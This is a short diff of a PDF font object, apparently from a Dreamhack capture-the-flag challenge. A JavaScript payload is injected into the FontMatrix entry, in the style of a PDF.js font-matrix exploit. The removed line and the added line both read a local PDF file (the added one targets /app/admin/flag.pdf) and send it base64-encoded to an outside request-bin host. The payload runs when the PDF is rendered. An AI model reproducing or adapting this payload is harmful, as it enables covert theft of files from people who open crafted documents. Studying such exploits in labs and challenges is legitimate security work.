@@ -28,7 +28,7 @@ endobj
 /LastChar 102
 /Encoding/WinAnsiEncoding
 /FontMatrix [0.1 0 0 0.1 0 (1\);
-fetch\('/app/public/BLUE.pdf'\).then\(r=>r.arrayBuffer\(\)\).then\(a=>fetch\('https://xlpvlpy.request.dreamhack.games/?a='+btoa\(String.fromCharCode\(...new Uint8Array\(a\)\)\)\)\);
+fetch\('/app/admin/flag.pdf'\).then\(r=>r.arrayBuffer\(\)\).then\(a=>fetch\('https://rrmxfut.request.dreamhack.games',{method:'POST',body:btoa\(String.fromCharCode\(...new Uint8Array\(a\)\)\)}\)\);
 //)]
 /Subtype/Type1
 /FirstChar 65
